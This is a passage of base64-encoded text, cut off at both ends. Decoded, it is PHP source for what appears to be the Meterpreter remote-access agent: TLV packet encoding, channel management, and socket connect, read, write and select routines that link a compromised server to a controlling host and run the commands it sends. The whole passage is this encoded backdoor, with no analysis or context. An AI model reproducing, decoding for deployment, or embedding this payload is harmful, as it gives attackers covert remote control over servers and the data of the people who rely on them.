yY2U6IHskcmVzb3VyY2V9LCBmb3IgY2hhbm5lbDogeyRjaWR9Iik7IGNoYW5uZWxfY2xvc2VfaGFuZGxlcygkY2lkKTsgJHBrdCA9IHBhY2soIk4iLCBQQUNLRVRfVFlQRV9SRVFVRVNUKTsgcGFja2V0X2FkZF90bHYoJHBrdCwgY3JlYXRlX3RsdihUTFZfVFlQRV9DT01NQU5EX0lELCBDT01NQU5EX0lEX0NPUkVfQ0hBTk5FTF9DTE9TRSkpOyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX1JFUVVFU1RfSUQsIGdlbmVyYXRlX3JlcV9pZCgpKSk7IHBhY2tldF9hZGRfdGx2KCRwa3QsIGNyZWF0ZV90bHYoVExWX1RZUEVfQ0hBTk5FTF9JRCwgJGNpZCkpOyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX1VVSUQsICRHTE9CQUxTWydVVUlEJ10pKTsgJHBrdCA9IHBhY2soIk4iLCBzdHJsZW4oJHBrdCkgKyA0KSAuICRwa3Q7IHdyaXRlX3Rsdl90b19zb2NrZXQoJG1zZ3NvY2ssICRwa3QpOyB9IH0gZnVuY3Rpb24gaGFuZGxlX3Jlc291cmNlX3JlYWRfY2hhbm5lbCgkcmVzb3VyY2UsICRkYXRhKSB7IGdsb2JhbCAkdWRwX2hvc3RfbWFwOyAkY2lkID0gZ2V0X2NoYW5uZWxfaWRfZnJvbV9yZXNvdXJjZSgkcmVzb3VyY2UpOyBteV9wcmludCgiSGFuZGxpbmcgZGF0YSBmcm9tICRyZXNvdXJjZSIpOyAkcGt0ID0gcGFjaygiTiIsIFBBQ0tFVF9UWVBFX1JFUVVFU1QpOyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX0NPTU1BTkRfSUQsIENPTU1BTkRfSURfQ09SRV9DSEFOTkVMX1dSSVRFKSk7IGlmIChhcnJheV9rZXlfZXhpc3RzKChpbnQpJHJlc291cmNlLCAkdWRwX2hvc3RfbWFwKSkgeyBsaXN0KCRoLCRwKSA9ICR1ZHBfaG9zdF9tYXBbKGludCkkcmVzb3VyY2VdOyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX1BFRVJfSE9TVCwgJGgpKTsgcGFja2V0X2FkZF90bHYoJHBrdCwgY3JlYXRlX3RsdihUTFZfVFlQRV9QRUVSX1BPUlQsICRwKSk7IH0gcGFja2V0X2FkZF90bHYoJHBrdCwgY3JlYXRlX3RsdihUTFZfVFlQRV9DSEFOTkVMX0lELCAkY2lkKSk7IHBhY2tldF9hZGRfdGx2KCRwa3QsIGNyZWF0ZV90bHYoVExWX1RZUEVfQ0hBTk5FTF9EQVRBLCAkZGF0YSkpOyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX0xFTkdUSCwgc3RybGVuKCRkYXRhKSkpOyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX1JFUVVFU1RfSUQsIGdlbmVyYXRlX3JlcV9pZCgpKSk7IHBhY2tldF9hZGRfdGx2KCRwa3QsIGNyZWF0ZV90bHYoVExWX1RZUEVfVVVJRCwgJEdMT0JBTFNbJ1VVSUQnXSkpOyAkcGt0ID0gcGFjaygiTiIsIHN0cmxlbigkcGt0KSArIDQpIC4gJHBrdDsgcmV0dXJuICRwa3Q7IH0gZnVuY3Rpb24gY3JlYXRlX3Jlc3BvbnNlKCRyZXEpIHsgZ2xvYmFsICRpZDJmOyAkcGt0ID0gcGFjaygiTiIsIFBBQ0tFVF9UWVBFX1JFU1BPTlNFKTsgJGNvbW1hbmRfaWRfdGx2ID0gcGFja2V0X2dldF90bHYoJHJlcSwgVExWX1RZUEVfQ09NTUFORF9JRCk7IG15X3ByaW50KCJjb21tYW5kIGlkIGlzIHskY29tbWFuZF9pZF90bHZbJ3ZhbHVlJ119Iik7IHBhY2tldF9hZGRfdGx2KCRwa3QsICRjb21tYW5kX2lkX3Rsdik7ICRyZXFpZF90bHYgPSBwYWNrZXRfZ2V0X3RsdigkcmVxLCBUTFZfVFlQRV9SRVFVRVNUX0lEKTsgcGFja2V0X2FkZF90bHYoJHBrdCwgJHJlcWlkX3Rsdik7ICRjb21tYW5kX2hhbmRsZXIgPSAkaWQyZlskY29tbWFuZF9pZF90bHZbJ3ZhbHVlJ11dOyBpZiAoaXNfY2FsbGFibGUoJGNvbW1hbmRfaGFuZGxlcikpIHsgJHJlc3VsdCA9ICRjb21tYW5kX2hhbmRsZXIoJHJlcSwgJHBrdCk7IH0gZWxzZSB7IG15X3ByaW50KCJHb3QgYSByZXF1ZXN0IGZvciBzb21ldGhpbmcgSSBkb24ndCBrbm93IGhvdyB0byBoYW5kbGUgKCIgLiAkY29tbWFuZF9pZF90bHZbJ3ZhbHVlJ10gLiAiIC8gIi4gJGNvbW1hbmRfaGFuZGxlciAuIiksIHJldHVybmluZyBmYWlsdXJlIik7ICRyZXN1bHQgPSBFUlJPUl9GQUlMVVJFOyB9IHBhY2tldF9hZGRfdGx2KCRwa3QsIGNyZWF0ZV90bHYoVExWX1RZUEVfUkVTVUxULCAkcmVzdWx0KSk7IHBhY2tldF9hZGRfdGx2KCRwa3QsIGNyZWF0ZV90bHYoVExWX1RZUEVfVVVJRCwgJEdMT0JBTFNbJ1VVSUQnXSkpOyAkcGt0ID0gcGFjaygiTiIsIHN0cmxlbigkcGt0KSArIDQpIC4gJHBrdDsgcmV0dXJuICRwa3Q7IH0gZnVuY3Rpb24gY3JlYXRlX3RsdigkdHlwZSwgJHZhbCkgeyByZXR1cm4gYXJyYXkoICd0eXBlJyA9PiAkdHlwZSwgJ3ZhbHVlJyA9PiAkdmFsICk7IH0gZnVuY3Rpb24gdGx2X3BhY2soJHRsdikgeyAkcmV0ID0gIiI7IGlmICgoJHRsdlsndHlwZSddICYgVExWX01FVEFfVFlQRV9TVFJJTkcpID09IFRMVl9NRVRBX1RZUEVfU1RSSU5HKSB7ICRyZXQgPSBwYWNrKCJOTmEqIiwgOCArIHN0cmxlbigkdGx2Wyd2YWx1ZSddKSsxLCAkdGx2Wyd0eXBlJ10sICR0bHZbJ3ZhbHVlJ10gLiAiXDAiKTsgfSBlbHNlaWYgKCgkdGx2Wyd0eXBlJ10gJiBUTFZfTUVUQV9UWVBFX1FXT1JEKSA9PSBUTFZfTUVUQV9UWVBFX1FXT1JEKSB7ICRoaSA9ICgkdGx2Wyd2YWx1ZSddID4+IDMyKSAmIDB4RkZGRkZGRkY7ICRsbyA9ICR0bHZbJ3ZhbHVlJ10gJiAweEZGRkZGRkZGOyAkcmV0ID0gcGFjaygiTk5OTiIsIDggKyA4LCAkdGx2Wyd0eXBlJ10sICRoaSwgJGxvKTsgfSBlbHNlaWYgKCgkdGx2Wyd0eXBlJ10gJiBUTFZfTUVUQV9UWVBFX1VJTlQpID09IFRMVl9NRVRBX1RZUEVfVUlOVCkgeyAkcmV0ID0gcGFjaygiTk5OIiwgOCArIDQsICR0bHZbJ3R5cGUnXSwgJHRsdlsndmFsdWUnXSk7IH0gZWxzZWlmICgoJHRsdlsndHlwZSddICYgVExWX01FVEFfVFlQRV9CT09MKSA9PSBUTFZfTUVUQV9UWVBFX0JPT0wpIHsgJHJldCA9IHBhY2soIk5OIiwgOCArIDEsICR0bHZbJ3R5cGUnXSk7ICRyZXQgLj0gJHRsdlsndmFsdWUnXSA/ICJceDAxIiA6ICJceDAwIjsgfSBlbHNlaWYgKCgkdGx2Wyd0eXBlJ10gJiBUTFZfTUVUQV9UWVBFX1JBVykgPT0gVExWX01FVEFfVFlQRV9SQVcpIHsgJHJldCA9IHBhY2soIk5OIiwgOCArIHN0cmxlbigkdGx2Wyd2YWx1ZSddKSwgJHRsdlsndHlwZSddKSAuICR0bHZbJ3ZhbHVlJ107IH0gZWxzZWlmICgoJHRsdlsndHlwZSddICYgVExWX01FVEFfVFlQRV9HUk9VUCkgPT0gVExWX01FVEFfVFlQRV9HUk9VUCkgeyAkcmV0ID0gcGFjaygiTk4iLCA4ICsgc3RybGVuKCR0bHZbJ3ZhbHVlJ10pLCAkdGx2Wyd0eXBlJ10pIC4gJHRsdlsndmFsdWUnXTsgfSBlbHNlaWYgKCgkdGx2Wyd0eXBlJ10gJiBUTFZfTUVUQV9UWVBFX0NPTVBMRVgpID09IFRMVl9NRVRBX1RZUEVfQ09NUExFWCkgeyAkcmV0ID0gcGFjaygiTk4iLCA4ICsgc3RybGVuKCR0bHZbJ3ZhbHVlJ10pLCAkdGx2Wyd0eXBlJ10pIC4gJHRsdlsndmFsdWUnXTsgfSBlbHNlIHsgbXlfcHJpbnQoIkRvbid0IGtub3cgaG93IHRvIG1ha2UgYSB0bHYgb2YgdHlwZSAiLiAkdGx2Wyd0eXBlJ10gLiAiIChtZXRhIHR5cGUgIi4gc3ByaW50ZigiJTA4eCIsICR0bHZbJ3R5cGUnXSAmIFRMVl9NRVRBX1RZUEVfTUFTSykgLiIpLCB3dGYiKTsgfSByZXR1cm4gJHJldDsgfSBmdW5jdGlvbiB0bHZfdW5wYWNrKCRyYXdfdGx2KSB7ICR0bHYgPSB1bnBhY2soIk5sZW4vTnR5cGUiLCBzdWJzdHIoJHJhd190bHYsIDAsIDgpKTsgJHR5cGUgPSAkdGx2Wyd0eXBlJ107IG15X3ByaW50KCJsZW46IHskdGx2WydsZW4nXX0sIHR5cGU6IHskdGx2Wyd0eXBlJ119Iik7IGlmICgoJHR5cGUgJiBUTFZfTUVUQV9UWVBFX1NUUklORykgPT0gVExWX01FVEFfVFlQRV9TVFJJTkcpIHsgJHRsdiA9IHVucGFjaygiTmxlbi9OdHlwZS9hKnZhbHVlIiwgc3Vic3RyKCRyYXdfdGx2LCAwLCAkdGx2WydsZW4nXSkpOyAkdGx2Wyd2YWx1ZSddID0gc3RyX3JlcGxhY2UoIlwwIiwgIiIsICR0bHZbJ3ZhbHVlJ10pOyB9IGVsc2VpZiAoKCR0eXBlICYgVExWX01FVEFfVFlQRV9VSU5UKSA9PSBUTFZfTUVUQV9UWVBFX1VJTlQpIHsgJHRsdiA9IHVucGFjaygiTmxlbi9OdHlwZS9OdmFsdWUiLCBzdWJzdHIoJHJhd190bHYsIDAsICR0bHZbJ2xlbiddKSk7IH0gZWxzZWlmICgoJHR5cGUgJiBUTFZfTUVUQV9UWVBFX1FXT1JEKSA9PSBUTFZfTUVUQV9UWVBFX1FXT1JEKSB7ICR0bHYgPSB1bnBhY2soIk5sZW4vTnR5cGUvTmhpL05sbyIsIHN1YnN0cigkcmF3X3RsdiwgMCwgJHRsdlsnbGVuJ10pKTsgJHRsdlsndmFsdWUnXSA9ICR0bHZbJ2hpJ10gPDwgMzIgfCAkdGx2WydsbyddOyB9IGVsc2VpZiAoKCR0eXBlICYgVExWX01FVEFfVFlQRV9CT09MKSA9PSBUTFZfTUVUQV9UWVBFX0JPT0wpIHsgJHRsdiA9IHVucGFjaygiTmxlbi9OdHlwZS9jdmFsdWUiLCBzdWJzdHIoJHJhd190bHYsIDAsICR0bHZbJ2xlbiddKSk7IH0gZWxzZWlmICgoJHR5cGUgJiBUTFZfTUVUQV9UWVBFX1JBVykgPT0gVExWX01FVEFfVFlQRV9SQVcpIHsgJHRsdiA9IHVucGFjaygiTmxlbi9OdHlwZSIsICRyYXdfdGx2KTsgJHRsdlsndmFsdWUnXSA9IHN1YnN0cigkcmF3X3RsdiwgOCwgJHRsdlsnbGVuJ10tOCk7IH0gZWxzZSB7IG15X3ByaW50KCJXdGYgdHlwZSBpcyB0aGlzPyAkdHlwZSIpOyAkdGx2ID0gbnVsbDsgfSByZXR1cm4gJHRsdjsgfSBmdW5jdGlvbiBwYWNrZXRfYWRkX3RsdigmJHBrdCwgJHRsdikgeyAkcGt0IC49IHRsdl9wYWNrKCR0bHYpOyB9IGZ1bmN0aW9uIHBhY2tldF9nZXRfdGx2KCRwa3QsICR0eXBlKSB7ICRvZmZzZXQgPSA4OyB3aGlsZSAoJG9mZnNldCA8IHN0cmxlbigkcGt0KSkgeyAkdGx2ID0gdGx2X3VucGFjayhzdWJzdHIoJHBrdCwgJG9mZnNldCkpOyBpZiAoJHR5cGUgPT0gKCR0bHZbJ3R5cGUnXSAmIH5UTFZfTUVUQV9UWVBFX0NPTVBSRVNTRUQpKSB7IHJldHVybiAkdGx2OyB9ICRvZmZzZXQgKz0gJHRsdlsnbGVuJ107IH0gcmV0dXJuIG51bGw7IH0gZnVuY3Rpb24gcGFja2V0X2dldF9hbGxfdGx2cygkcGt0LCAkdHlwZSkgeyBteV9wcmludCgiTG9va2luZyBmb3IgYWxsIHRsdnMgb2YgdHlwZSAkdHlwZSIpOyAkb2Zmc2V0ID0gODsgJGFsbCA9IGFycmF5KCk7IHdoaWxlICgkb2Zmc2V0IDwgc3RybGVuKCRwa3QpKSB7ICR0bHYgPSB0bHZfdW5wYWNrKHN1YnN0cigkcGt0LCAkb2Zmc2V0KSk7IGlmICgkdGx2ID09IE5VTEwpIHsgYnJlYWs7IH0gbXlfcHJpbnQoImxlbjogeyR0bHZbJ2xlbiddfSwgdHlwZTogeyR0bHZbJ3R5cGUnXX0iKTsgaWYgKGVtcHR5KCR0eXBlKSB8fCAkdHlwZSA9PSAoJHRsdlsndHlwZSddICYgflRMVl9NRVRBX1RZUEVfQ09NUFJFU1NFRCkpIHsgbXlfcHJpbnQoIkZvdW5kIG9uZSBhdCBvZmZzZXQgJG9mZnNldCIpOyBhcnJheV9wdXNoKCRhbGwsICR0bHYpOyB9ICRvZmZzZXQgKz0gJHRsdlsnbGVuJ107IH0gcmV0dXJuICRhbGw7IH0gZnVuY3Rpb24gcmVnaXN0ZXJfc29ja2V0KCRzb2NrLCAkaXBhZGRyPW51bGwsICRwb3J0PW51bGwpIHsgZ2xvYmFsICRyZXNvdXJjZV90eXBlX21hcCwgJHVkcF9ob3N0X21hcDsgbXlfcHJpbnQoIlJlZ2lzdGVyaW5nIHNvY2tldCAkc29jayBmb3IgKCRpcGFkZHI6JHBvcnQpIik7ICRyZXNvdXJjZV90eXBlX21hcFsoaW50KSRzb2NrXSA9ICdzb2NrZXQnOyBpZiAoJGlwYWRkcikgeyAkdWRwX2hvc3RfbWFwWyhpbnQpJHNvY2tdID0gYXJyYXkoJGlwYWRkciwgJHBvcnQpOyB9IH0gZnVuY3Rpb24gcmVnaXN0ZXJfc3RyZWFtKCRzdHJlYW0sICRpcGFkZHI9bnVsbCwgJHBvcnQ9bnVsbCkgeyBnbG9iYWwgJHJlc291cmNlX3R5cGVfbWFwLCAkdWRwX2hvc3RfbWFwOyBteV9wcmludCgiUmVnaXN0ZXJpbmcgc3RyZWFtICRzdHJlYW0gZm9yICgkaXBhZGRyOiRwb3J0KSIpOyAkcmVzb3VyY2VfdHlwZV9tYXBbKGludCkkc3RyZWFtXSA9ICdzdHJlYW0nOyBpZiAoJGlwYWRkcikgeyAkdWRwX2hvc3RfbWFwWyhpbnQpJHN0cmVhbV0gPSBhcnJheSgkaXBhZGRyLCAkcG9ydCk7IH0gfSBmdW5jdGlvbiBjb25uZWN0KCRpcGFkZHIsICRwb3J0LCAkcHJvdG89J3RjcCcpIHsgbXlfcHJpbnQoIkRvaW5nIGNvbm5lY3QoJGlwYWRkciwgJHBvcnQpIik7ICRzb2NrID0gZmFsc2U7ICRpcGYgPSBBRl9JTkVUOyAkcmF3X2lwID0gJGlwYWRkcjsgaWYgKEZBTFNFICE9PSBzdHJwb3MoJGlwYWRkciwgIjoiKSkgeyAkaXBmID0gQUZfSU5FVDY7ICRpcGFkZHIgPSAiWyIuICRyYXdfaXAgLiJdIjsgfSBpZiAoaXNfY2FsbGFibGUoJ3N0cmVhbV9zb2NrZXRfY2xpZW50JykpIHsgbXlfcHJpbnQoInN0cmVhbV9zb2NrZXRfY2xpZW50KHskcHJvdG99Oi8veyRpcGFkZHJ9OnskcG9ydH0pIik7IGlmICgkcHJvdG8gPT0gJ3NzbCcpIHsgJHNvY2sgPSBzdHJlYW1fc29ja2V0X2NsaWVudCgic3NsOi8veyRpcGFkZHJ9OnskcG9ydH0iLCAkZXJybm8sICRlcnJzdHIsIDUsIFNUUkVBTV9DTElFTlRfQVNZTkNfQ09OTkVDVCk7IGlmICghJHNvY2spIHsgcmV0dXJuIGZhbHNlOyB9IHN0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssIDApOyByZWdpc3Rlcl9zdHJlYW0oJHNvY2spOyB9IGVsc2VpZiAoJHByb3RvID09ICd0Y3AnKSB7ICRzb2NrID0gc3RyZWFtX3NvY2tldF9jbGllbnQoInRjcDovL3skaXBhZGRyfTp7JHBvcnR9Iik7IGlmICghJHNvY2spIHsgcmV0dXJuIGZhbHNlOyB9IHJlZ2lzdGVyX3N0cmVhbSgkc29jayk7IH0gZWxzZWlmICgkcHJvdG8gPT0gJ3VkcCcpIHsgJHNvY2sgPSBzdHJlYW1fc29ja2V0X2NsaWVudCgidWRwOi8veyRpcGFkZHJ9OnskcG9ydH0iKTsgaWYgKCEkc29jaykgeyByZXR1cm4gZmFsc2U7IH0gcmVnaXN0ZXJfc3RyZWFtKCRzb2NrLCAkaXBhZGRyLCAkcG9ydCk7IH0gfSBlbHNlIGlmIChpc19jYWxsYWJsZSgnZnNvY2tvcGVuJykpIHsgbXlfcHJpbnQoImZzb2Nrb3BlbiIpOyBpZiAoJHByb3RvID09ICdzc2wnKSB7ICRzb2NrID0gZnNvY2tvcGVuKCJzc2w6Ly97JGlwYWRkcn06eyRwb3J0fSIpOyBzdHJlYW1fc2V0X2Jsb2NraW5nKCRzb2NrLCAwKTsgcmVnaXN0ZXJfc3RyZWFtKCRzb2NrKTsgfSBlbHNlaWYgKCRwcm90byA9PSAndGNwJykgeyAkc29jayA9IGZzb2Nrb3BlbigkaXBhZGRyLCAkcG9ydCk7IGlmICghJHNvY2spIHsgcmV0dXJuIGZhbHNlOyB9IGlmIChpc19jYWxsYWJsZSgnc29ja2V0X3NldF90aW1lb3V0JykpIHsgc29ja2V0X3NldF90aW1lb3V0KCRzb2NrLCAyKTsgfSByZWdpc3Rlcl9zdHJlYW0oJHNvY2spOyB9IGVsc2UgeyAkc29jayA9IGZzb2Nrb3BlbigkcHJvdG8uIjovLyIuJGlwYWRkciwkcG9ydCk7IGlmICghJHNvY2spIHsgcmV0dXJuIGZhbHNlOyB9IHJlZ2lzdGVyX3N0cmVhbSgkc29jaywgJGlwYWRkciwgJHBvcnQpOyB9IH0gZWxzZSBpZiAoaXNfY2FsbGFibGUoJ3NvY2tldF9jcmVhdGUnKSkgeyBteV9wcmludCgic29ja2V0X2NyZWF0ZSIpOyBpZiAoJHByb3RvID09ICd0Y3AnKSB7ICRzb2NrID0gc29ja2V0X2NyZWF0ZSgkaXBmLCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBzb2NrZXRfY29ubmVjdCgkc29jaywgJHJhd19pcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgcmV0dXJuIGZhbHNlOyB9IHJlZ2lzdGVyX3NvY2tldCgkc29jayk7IH0gZWxzZWlmICgkcHJvdG8gPT0gJ3VkcCcpIHsgJHNvY2sgPSBzb2NrZXRfY3JlYXRlKCRpcGYsIFNPQ0tfREdSQU0sIFNPTF9VRFApOyByZWdpc3Rlcl9zb2NrZXQoJHNvY2ssICRyYXdfaXAsICRwb3J0KTsgfSB9IHJldHVybiAkc29jazsgfSBmdW5jdGlvbiBlb2YoJHJlc291cmNlKSB7ICRyZXQgPSBmYWxzZTsgc3dpdGNoIChnZXRfcnR5cGUoJHJlc291cmNlKSkgeyBjYXNlICdzb2NrZXQnOiBicmVhazsgY2FzZSAnc3RyZWFtJzogJHJldCA9IGZlb2YoJHJlc291cmNlKTsgYnJlYWs7IH0gcmV0dXJuICRyZXQ7IH0gZnVuY3Rpb24gY2xvc2UoJHJlc291cmNlKSB7IG15X3ByaW50KCJDbG9zaW5nIHJlc291cmNlICRyZXNvdXJjZSIpOyBnbG9iYWwgJHJlc291cmNlX3R5cGVfbWFwLCAkdWRwX2hvc3RfbWFwOyByZW1vdmVfcmVhZGVyKCRyZXNvdXJjZSk7IHN3aXRjaCAoZ2V0X3J0eXBlKCRyZXNvdXJjZSkpIHsgY2FzZSAnc29ja2V0JzogJHJldCA9IHNvY2tldF9jbG9zZSgkcmVzb3VyY2UpOyBicmVhazsgY2FzZSAnc3RyZWFtJzogJHJldCA9IGZjbG9zZSgkcmVzb3VyY2UpOyBicmVhazsgfSBpZiAoYXJyYXlfa2V5X2V4aXN0cygoaW50KSRyZXNvdXJjZSwgJHJlc291cmNlX3R5cGVfbWFwKSkgeyB1bnNldCgkcmVzb3VyY2VfdHlwZV9tYXBbKGludCkkcmVzb3VyY2VdKTsgfSBpZiAoYXJyYXlfa2V5X2V4aXN0cygoaW50KSRyZXNvdXJjZSwgJHVkcF9ob3N0X21hcCkpIHsgbXlfcHJpbnQoIlJlbW92aW5nICRyZXNvdXJjZSBmcm9tIHVkcF9ob3N0X21hcCIpOyB1bnNldCgkdWRwX2hvc3RfbWFwWyhpbnQpJHJlc291cmNlXSk7IH0gcmV0dXJuICRyZXQ7IH0gZnVuY3Rpb24gcmVhZCgkcmVzb3VyY2UsICRsZW49bnVsbCkgeyBnbG9iYWwgJHVkcF9ob3N0X21hcDsgaWYgKGlzX251bGwoJGxlbikpIHsgJGxlbiA9IDgxOTI7IH0gJGJ1ZmYgPSAnJzsgc3dpdGNoIChnZXRfcnR5cGUoJHJlc291cmNlKSkgeyBjYXNlICdzb2NrZXQnOiBpZiAoYXJyYXlfa2V5X2V4aXN0cygoaW50KSRyZXNvdXJjZSwgJHVkcF9ob3N0X21hcCkpIHsgbXlfcHJpbnQoIlJlYWRpbmcgVURQIHNvY2tldCIpOyBsaXN0KCRob3N0LCRwb3J0KSA9ICR1ZHBfaG9zdF9tYXBbKGludCkkcmVzb3VyY2VdOyBzb2NrZXRfcmVjdmZyb20oJHJlc291cmNlLCAkYnVmZiwgJGxlbiwgUEhQX0JJTkFSWV9SRUFELCAkaG9zdCwgJHBvcnQpOyB9IGVsc2UgeyBteV9wcmludCgiUmVhZGluZyBUQ1Agc29ja2V0Iik7ICRidWZmIC49IHNvY2tldF9yZWFkKCRyZXNvdXJjZSwgJGxlbiwgUEhQX0JJTkFSWV9SRUFEKTsgfSBicmVhazsgY2FzZSAnc3RyZWFtJzogZ2xvYmFsICRtc2dzb2NrOyAkciA9IEFycmF5KCRyZXNvdXJjZSk7IG15X3ByaW50KCJDYWxsaW5nIHNlbGVjdCB0byBzZWUgaWYgdGhlcmUncyBkYXRhIG9uICRyZXNvdXJjZSIpOyAkbGFzdF9yZXF1ZXN0ZWRfbGVuID0gMDsgd2hpbGUgKHRydWUpIHsgJHc9TlVMTDskZT1OVUxMOyR0PTA7ICRjbnQgPSBzdHJlYW1fc2VsZWN0KCRyLCAkdywgJGUsICR0KTsgaWYgKCRjbnQgPT09IDApIHsgYnJlYWs7IH0gaWYgKCRjbnQgPT09IGZhbHNlIG9yIGZlb2YoJHJlc291cmNlKSkgeyBteV9wcmludCgiQ2hlY2tpbmcgZm9yIGZhaWxlZCByZWFkLi4uIik7IGlmIChlbXB0eSgkYnVmZikpIHsgbXlfcHJpbnQoIi0tLS0gRU9GIE9OICRyZXNvdXJjZSAtLS0tIik7ICRidWZmID0gZmFsc2U7IH0gYnJlYWs7IH0gJG1kID0gc3RyZWFtX2dldF9tZXRhX2RhdGEoJHJlc291cmNlKTsgZHVtcF9hcnJheSgkbWQsICJNZXRhZGF0YSBmb3IgeyRyZXNvdXJjZX0iKTsgaWYgKCRtZFsndW5yZWFkX2J5dGVzJ10gPiAwKSB7ICRsYXN0X3JlcXVlc3RlZF9sZW4gPSBtaW4oJGxlbiwgJG1kWyd1bnJlYWRfYnl0ZXMnXSk7ICRidWZmIC49IGZyZWFkKCRyZXNvdXJjZSwgJGxhc3RfcmVxdWVzdGVkX2xlbik7IGJyZWFrOyB9IGVsc2UgeyAkdG1wID0gZnJlYWQoJHJlc291cmNlLCAkbGVuKTsgJGxhc3RfcmVxdWVzdGVkX2xlbiA9ICRsZW47ICRidWZmIC49ICR0bXA7IGlmIChzdHJsZW4oJHRtcCkgPCAkbGVuKSB7IGJyZWFrOyB9IH0gaWYgKCRyZXNvdXJjZSAhPSAkbXNnc29jaykgeyBteV9wcmludCgiYnVmZjogJyRidWZmJyIpOyB9ICRyID0gQXJyYXkoJHJlc291cmNlKTsgfSBteV9wcmludChzcHJpbnRmKCJEb25lIHdpdGggdGhlIGJpZyByZWFkIGxvb3Agb24gJHJlc291cmNlLCBnb3QgJWQgYnl0ZXMsIGFza2VkIGZvciAlZCBieXRlcyIsIHN0cmxlbigkYnVmZiksICRsYXN0X3JlcXVlc3RlZF9sZW4pKTsgYnJlYWs7IGRlZmF1bHQ6ICRjaWQgPSBnZXRfY2hhbm5lbF9pZF9mcm9tX3Jlc291cmNlKCRyZXNvdXJjZSk7ICRjID0gZ2V0X2NoYW5uZWxfYnlfaWQoJGNpZCk7IGlmICgkYyBhbmQgJGNbJ2RhdGEnXSkgeyAkYnVmZiA9IHN1YnN0cigkY1snZGF0YSddLCAwLCAkbGVuKTsgJGNbJ2RhdGEnXSA9IHN1YnN0cigkY1snZGF0YSddLCAkbGVuKTsgbXlfcHJpbnQoIkFoYSEgZ290IHNvbWUgbGVmdG92ZXJzIik7IH0gZWxzZSB7IG15X3ByaW50KCJXdGYgZG9uJ3Qga25vdyBob3cgdG8gcmVhZCBmcm9tIHJlc291cmNlICRyZXNvdXJjZSwgYzogJGMiKTsgaWYgKGlzX2FycmF5KCRjKSkgeyBkdW1wX2FycmF5KCRjKTsgfSBicmVhazsgfSB9IG15X3ByaW50KHNwcmludGYoIlJlYWQgJWQgYnl0ZXMiLCBzdHJsZW4oJGJ1ZmYpKSk7IHJldHVybiAkYnVmZjsgfSBmdW5jdGlvbiB3cml0ZSgkcmVzb3VyY2UsICRidWZmLCAkbGVuPTApIHsgZ2xvYmFsICR1ZHBfaG9zdF9tYXA7IGlmICgkbGVuID09IDApIHsgJGxlbiA9IHN0cmxlbigkYnVmZik7IH0gJGNvdW50ID0gZmFsc2U7IHN3aXRjaCAoZ2V0X3J0eXBlKCRyZXNvdXJjZSkpIHsgY2FzZSAnc29ja2V0JzogaWYgKGFycmF5X2tleV9leGlzdHMoKGludCkkcmVzb3VyY2UsICR1ZHBfaG9zdF9tYXApKSB7IG15X3ByaW50KCJXcml0aW5nIFVEUCBzb2NrZXQiKTsgbGlzdCgkaG9zdCwkcG9ydCkgPSAkdWRwX2hvc3RfbWFwWyhpbnQpJHJlc291cmNlXTsgJGNvdW50ID0gc29ja2V0X3NlbmR0bygkcmVzb3VyY2UsICRidWZmLCAkbGVuLCAkaG9zdCwgJHBvcnQpOyB9IGVsc2UgeyAkY291bnQgPSBzb2NrZXRfd3JpdGUoJHJlc291cmNlLCAkYnVmZiwgJGxlbik7IH0gYnJlYWs7IGNhc2UgJ3N0cmVhbSc6ICRjb3VudCA9IGZ3cml0ZSgkcmVzb3VyY2UsICRidWZmLCAkbGVuKTsgZmZsdXNoKCRyZXNvdXJjZSk7IGJyZWFrOyBkZWZhdWx0OiBteV9wcmludCgiV3RmIGRvbid0IGtub3cgaG93IHRvIHdyaXRlIHRvIHJlc291cmNlICRyZXNvdXJjZSIpOyBicmVhazsgfSByZXR1cm4gJGNvdW50OyB9IGZ1bmN0aW9uIGdldF9ydHlwZSgkcmVzb3VyY2UpIHsgZ2xvYmFsICRyZXNvdXJjZV90eXBlX21hcDsgaWYgKGFycmF5X2tleV9leGlzdHMoKGludCkkcmVzb3VyY2UsICRyZXNvdXJjZV90eXBlX21hcCkpIHsgcmV0dXJuICRyZXNvdXJjZV90eXBlX21hcFsoaW50KSRyZXNvdXJjZV07IH0gcmV0dXJuIGZhbHNlOyB9IGZ1bmN0aW9uIHNlbGVjdCgmJHIsICYkdywgJiRlLCAkdHZfc2VjPTAsICR0dl91c2VjPTApIHsgJHN0cmVhbXNfciA9IGFycmF5KCk7ICRzdHJlYW1zX3cgPSBhcnJheSgpOyAkc3RyZWFtc19lID0gYXJyYXkoKTsgJHNvY2tldHNfciA9IGFycmF5KCk7ICRzb2NrZXRzX3cgPSBhcnJheSgpOyAkc29ja2V0c19lID0gYXJyYXkoKTsgaWYgKCRyKSB7IGZvcmVhY2ggKCRyIGFzICRyZXNvdXJjZSkgeyBzd2l0Y2ggKGdldF9ydHlwZSgkcmVzb3VyY2UpKSB7IGNhc2UgJ3NvY2tldCc6ICRzb2NrZXRzX3JbXSA9ICRyZXNvdXJjZTsgYnJlYWs7IGNhc2UgJ3N0cmVhbSc6ICRzdHJlYW1zX3JbXSA9ICRyZXNvdXJjZTsgYnJlYWs7IGRlZmF1bHQ6IG15X3ByaW50KCJVbmtub3duIHJlc291cmNlIHR5cGUiKTsgYnJlYWs7IH0gfSB9IGlmICgkdykgeyBmb3JlYWNoICgkdyBhcyAkcmVzb3VyY2UpIHsgc3dpdGNoIChnZXRfcnR5cGUoJHJlc291cmNlKSkgeyBjYXNlICdzb2NrZXQnOiAkc29ja2V0c193W10gPSAkcmVzb3VyY2U7IGJyZWFrOyBjYXNlICdzdHJlYW0nOiAkc3RyZWFtc193W10gPSAkcmVzb3VyY2U7IGJyZWFrOyBkZWZhdWx0OiBteV9wcmludCgiVW5rbm93biByZXNvdXJjZSB0eXBlIik7IGJyZWFrOyB9IH0gfSBpZiAoJGUpIHsgZm9yZWFjaCAoJGUgYXMgJHJlc291cmNlKSB7IHN3aXRjaCAoZ2V